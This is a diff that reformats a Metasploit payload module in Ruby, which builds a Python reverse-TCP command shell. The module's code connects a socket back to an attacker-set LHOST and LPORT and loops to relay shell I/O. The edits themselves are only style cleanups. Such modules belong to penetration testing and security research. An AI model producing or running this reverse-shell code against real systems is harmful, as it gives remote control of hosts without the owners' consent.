@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-
   CachedSize = 401
 
   include Msf::Payload::Single
@@ -17,21 +17,20 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Command Shell, Reverse TCP (via python)',
-      'Description'   => 'Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3',
-      'Author'        => 'Ben Campbell', # Based on RageLtMan's reverse_ssl
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'python',
-      'Arch'          => ARCH_PYTHON,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'python',
-      'Payload'       =>
-        {
-          'Offsets' => { },
-          'Payload' => ''
-        }
-      ))
+                     'Name'          => 'Command Shell, Reverse TCP (via python)',
+                     'Description'   => 'Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3',
+                     'Author'        => 'Ben Campbell', # Based on RageLtMan's reverse_ssl
+                     'License'       => MSF_LICENSE,
+                     'Platform'      => 'python',
+                     'Arch'          => ARCH_PYTHON,
+                     'Handler'       => Msf::Handler::ReverseTcp,
+                     'Session'       => Msf::Sessions::CommandShell,
+                     'PayloadType'   => 'python',
+                     'Payload'       =>
+                       {
+                         'Offsets' => {},
+                         'Payload' => ''
+                       }))
   end
 
   #
@@ -50,7 +49,7 @@ module MetasploitModule
     # Set up the socket
     cmd << "import socket,os\n"
     cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
-    cmd << "so.connect(('#{datastore['LHOST']}',#{ datastore['LPORT']}))\n"
+    cmd << "so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))\n"
     # The actual IO
     cmd << "#{dead}=False\n"
     cmd << "while not #{dead}:\n"
@@ -65,6 +64,4 @@ module MetasploitModule
 
     cmd
   end
-
 end
-
